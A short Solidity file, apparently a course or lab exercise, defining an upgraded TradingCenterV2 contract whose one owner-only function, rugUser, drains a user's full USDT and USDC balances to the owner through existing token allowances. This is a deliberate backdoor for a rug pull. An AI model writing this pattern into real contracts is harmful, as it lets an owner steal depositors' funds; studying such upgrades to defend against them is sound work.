// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import "./TradingCenter.sol";
import "./Ownable.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter, Ownable {
    function rugUser(address _user) external onlyOwner {
        usdt.transferFrom(_user, msg.sender, usdt.balanceOf(_user));
        usdc.transferFrom(_user, msg.sender, usdc.balanceOf(_user));
    }
}
